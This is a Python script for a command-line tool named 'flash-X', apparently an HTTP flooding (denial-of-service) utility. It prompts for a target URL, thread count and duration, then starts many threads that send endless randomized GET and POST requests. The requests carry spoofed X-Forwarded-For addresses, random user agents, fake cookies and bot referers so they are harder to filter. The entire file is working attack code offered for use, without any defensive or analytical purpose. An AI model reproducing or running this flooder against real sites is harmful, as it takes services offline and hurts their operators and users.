import os
import json
import random
import string
import threading
import time
import warnings
from typing import Dict

import faker
import requests
from colorama import Fore as F
from fake_useragent import UserAgent
from halo import Halo
import cfonts

# إ
os.system('clear')

# 
with open("info.json", "r") as f:
    data = json.load(f)
    version = data["version"]
    author = data["author"]

# logo App
logo = cfonts.render(
    text="flash-X",
    colors=["white", "cyan"],
    align="center"
)
print(logo)
print('-' * 60)
print(f"""
Version : {F.CYAN}{version} {F.RESET}( {F.CYAN}2024 {F.WHITE}- {F.CYAN}11 {F.WHITE}- {F.CYAN}16 {F.RESET}).
Author  : {F.CYAN}{author}{F.RESET}.
Method  : {F.CYAN}HTTP{F.RESET}.
""")
print('-' * 60)

# إعداد المكتبات
fake = faker.Faker()
warnings.filterwarnings("ignore", message="Unverified HTTPS request")
ua = UserAgent()

def build_cookies() -> Dict[str, str]:
    """Create Cookies """
    cookies = {}
    key = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 10)))
    value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 15)))
    cookies[key] = value
    return cookies

def build_block(size: int) -> str:
    
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def referer_bot() -> str:
    
    with open("tools/bot.txt", "r") as b:
        bots = b.readlines()
        random_bot = random.choice(bots).strip()
        block = build_block(random.randint(3, 15))
    return random_bot + block


botRef = referer_bot()

def generate_headers() -> Dict[str, str]:
    """ headers HTTP."""
    return {
        "User-Agent": ua.random,
        "X-Requested-With": "XMLHttpRequest",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": botRef,
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive",
        "Keep-Alive": str(random.randint(110, 120)),
        "X-Forwarded-For": fake.ipv4(),
    }

def generate_rand_data() -> Dict[str, str]:
    
    return {
        "q": build_block(size=random.randint(3, 10)) + "=" + build_block(size=random.randint(3, 10)),
    }

def flood(target: str) -> None:
   
    while True:
        try:
            type_request = random.choice(["GET", "POST"])
            headers = generate_headers()
            params = generate_rand_data()

            if type_request == "GET":
                response = requests.get(target, headers=headers, params=params, timeout=5)
            else:
                response = requests.post(target, headers=headers, timeout=5)

            status_color = F.GREEN if response.status_code == 200 else F.RED
            print(f"{status_color}({response.status_code}) {F.CYAN}{type_request} Successful Attack!{F.RESET}")

        except requests.exceptions.RequestException:
            print(f"{F.RED}( !!! ) {F.RESET}Request Failed...")

def start_flooding(target: str, thread_count: int, duration: int, time_sleep: int) -> None:
    """إطلاق خيوط متعددة لتنفيذ الهجوم."""
    stop_time = time.time() + duration
    for _ in range(thread_count):
        thread = threading.Thread(target=flood, args=(target,))
        thread.daemon = True
        thread.start()

    while time.time() < stop_time:
        time.sleep(time_sleep)

    print(f"\n{F.CYAN}( Done ) {F.GREEN}Attack finished after {F.RED}{duration} seconds.{F.RESET}")

if __name__ == "__main__":
    # إدخال معلومات الهجوم
    target_url = input(f'\n{F.RESET}┌─({F.CYAN}flashX{F.RESET})─({F.YELLOW}~ TARGET URL{F.RESET})\n└──{F.YELLOW}~: {F.CYAN}')
    num_threads = int(input(f'\n{F.RESET}┌─({F.CYAN}flashX{F.RESET})─({F.YELLOW}~ THREADS{F.RESET})\n└──{F.YELLOW}~: {F.CYAN}'))
    duration = int(input(f'\n{F.RESET}┌─({F.CYAN}flashX{F.RESET})─({F.YELLOW}~ TIME ATTACK{F.RESET})\n└──{F.YELLOW}~: {F.CYAN}'))
    time_sleep = int(input(f'\n{F.RESET}┌─({F.CYAN}flashX{F.RESET})─({F.YELLOW}~ TIME SLEEP{F.RESET})\n└──{F.YELLOW}~: {F.CYAN}'))

    print(f"""
- {F.RESET} Attack On {F.CYAN}{target_url}{F.RESET} For {F.CYAN}{duration}{F.RESET} Using {F.CYAN}{num_threads} Threads.
-----------------------------------------------------------
""")
    spinner = Halo(text="Loading ...", spinner="dots")
    spinner.start()
    time.sleep(2)
    spinner.stop()

    start_flooding(target_url, num_threads, duration, time_sleep)
